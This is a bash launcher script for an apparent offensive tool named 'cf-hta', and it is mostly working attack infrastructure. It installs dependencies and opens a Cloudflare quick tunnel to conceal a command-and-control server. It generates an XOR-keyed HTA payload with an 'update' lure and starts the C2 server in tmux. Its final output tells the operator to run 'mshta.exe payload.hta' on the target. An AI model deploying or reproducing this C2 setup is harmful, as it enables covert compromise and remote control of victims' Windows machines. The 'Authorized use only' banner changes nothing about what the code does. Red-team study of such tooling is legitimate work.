#!/usr/bin/env bash
# cf-hta setup script for Kali Linux
# Installs dependencies and launches the full C2 stack in tmux

set -e

RED='\033[0;31m'
GRN='\033[0;32m'
YEL='\033[1;33m'
CYN='\033[0;36m'
NC='\033[0m'

CFHTA_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT="${PORT:-8080}"

banner(){
    echo -e "${CYN}"
    echo "  ██████╗███████╗      ██╗  ██╗████████╗ █████╗ "
    echo " ██╔════╝██╔════╝      ██║  ██║╚══██╔══╝██╔══██╗"
    echo " ██║     █████╗  █████╗███████║   ██║   ███████║"
    echo " ██║     ██╔══╝  ╚════╝██╔══██║   ██║   ██╔══██║"
    echo " ╚██████╗██║           ██║  ██║   ██║   ██║  ██║"
    echo "  ╚═════╝╚═╝           ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "  ${YEL}Cloudflare-tunneled HTA C2 — Authorized use only${NC}"
    echo ""
}

check_deps(){
    echo -e "${CYN}[*] Checking dependencies...${NC}"

    # Python + pip
    if ! command -v python3 &>/dev/null; then
        echo -e "${RED}[!] python3 not found. Install it: sudo apt install python3${NC}"
        exit 1
    fi

    # Flask
    if ! python3 -c "import flask" 2>/dev/null; then
        echo -e "${YEL}[*] Installing Flask...${NC}"
        pip3 install flask --quiet
    fi
    echo -e "${GRN}[+] Flask OK${NC}"

    # tmux
    if ! command -v tmux &>/dev/null; then
        echo -e "${YEL}[*] Installing tmux...${NC}"
        sudo apt-get install -y tmux --quiet
    fi
    echo -e "${GRN}[+] tmux OK${NC}"

    # cloudflared
    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YEL}[*] Installing cloudflared...${NC}"
        ARCH=$(dpkg --print-architecture)
        CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${ARCH}.deb"
        TMP=$(mktemp /tmp/cloudflared-XXXX.deb)
        curl -sL "$CF_URL" -o "$TMP"
        sudo dpkg -i "$TMP" &>/dev/null
        rm -f "$TMP"
    fi
    echo -e "${GRN}[+] cloudflared OK${NC}"

    echo ""
}

generate_payload(){
    local url="$1"
    local key="$2"
    local lure="${3:-update}"
    local out="$CFHTA_DIR/payload.hta"

    echo -e "${CYN}[*] Generating payload...${NC}"
    python3 "$CFHTA_DIR/gen.py" "$url" --key "$key" --out "$out" --lure "$lure"
    echo -e "${GRN}[+] Payload → $out${NC}"
    echo ""
}

launch(){
    local SESSION="cf-hta"
    local KEY

    # Generate random key if not set
    KEY=$(openssl rand -hex 16)

    # Kill existing session if any
    tmux kill-session -t "$SESSION" 2>/dev/null || true

    echo -e "${CYN}[*] Starting tmux session: $SESSION${NC}"
    echo ""

    # Create session with tunnel in first window
    tmux new-session -d -s "$SESSION" -x 220 -y 50

    # Window 0: cloudflared tunnel
    tmux rename-window -t "$SESSION:0" "tunnel"
    tmux send-keys -t "$SESSION:0" "cloudflared tunnel --url http://localhost:$PORT --no-autoupdate 2>&1 | tee /tmp/cf-tunnel.log" Enter

    echo -e "${YEL}[*] Waiting for tunnel URL...${NC}"
    local TUNNEL_URL=""
    local attempts=0
    while [[ -z "$TUNNEL_URL" && $attempts -lt 30 ]]; do
        sleep 2
        TUNNEL_URL=$(grep -oP 'https://[a-z0-9\-]+\.trycloudflare\.com' /tmp/cf-tunnel.log 2>/dev/null | head -1)
        ((attempts++))
    done

    if [[ -z "$TUNNEL_URL" ]]; then
        echo -e "${RED}[!] Tunnel URL not found after 60s. Check /tmp/cf-tunnel.log${NC}"
        exit 1
    fi

    echo -e "${GRN}[+] Tunnel: $TUNNEL_URL${NC}"

    # Generate payload
    generate_payload "$TUNNEL_URL" "$KEY"

    # Window 1: C2 server
    tmux new-window -t "$SESSION" -n "c2"
    tmux send-keys -t "$SESSION:c2" "cd $CFHTA_DIR && python3 server.py --port $PORT --key $KEY" Enter

    # Enable mouse scrolling
    tmux set-option -t "$SESSION" mouse on

    echo ""
    echo -e "${GRN}════════════════════════════════════════════════════${NC}"
    echo -e "${GRN}  C2 READY${NC}"
    echo -e "${GRN}════════════════════════════════════════════════════${NC}"
    echo -e "  Tunnel URL : ${CYN}$TUNNEL_URL${NC}"
    echo -e "  XOR Key    : ${CYN}$KEY${NC}"
    echo -e "  Payload    : ${CYN}$CFHTA_DIR/payload.hta${NC}"
    echo -e "  Port       : ${CYN}$PORT${NC}"
    echo ""
    echo -e "  Attach to C2 console:"
    echo -e "  ${YEL}tmux attach -t $SESSION${NC}"
    echo ""
    echo -e "  Delivery (on target):"
    echo -e "  ${YEL}mshta.exe payload.hta${NC}"
    echo -e "${GRN}════════════════════════════════════════════════════${NC}"
    echo ""

    # Auto-attach
    tmux attach -t "$SESSION"
}

# ── Main ─────────────────────────────────────────────────────────────────────
banner
check_deps
launch
